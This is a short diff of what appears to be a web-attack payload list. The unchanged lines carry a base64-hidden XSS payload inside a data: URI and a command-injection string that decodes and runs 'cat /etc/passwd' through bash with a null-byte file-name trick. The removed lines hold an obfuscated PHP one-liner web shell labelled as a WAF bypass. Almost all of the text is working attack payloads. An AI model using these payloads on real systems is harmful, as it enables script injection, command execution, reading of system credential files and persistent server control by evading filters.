@@ -64,7 +64,4 @@ data%3Atext%2Fhtml%3Bbase64%2CPGltZyBzcmM9eCBvbmVycm9yPWphdmFzY3JpcHQ6cHJvbXB0KG
 </br>
 ;echo%20Y2F0IC9ldGMvcGFzc3dkCg==|base64%20-d|bash%00.zip | grep root:.*:0:0
 
-<h1>Bypass Waf shell php </h1>
-</br>
-[++++++]<?=~$_='$<>/'^'{{{{';@${$_}[_](@${$_}[__]);[++++++]
-</br>
+
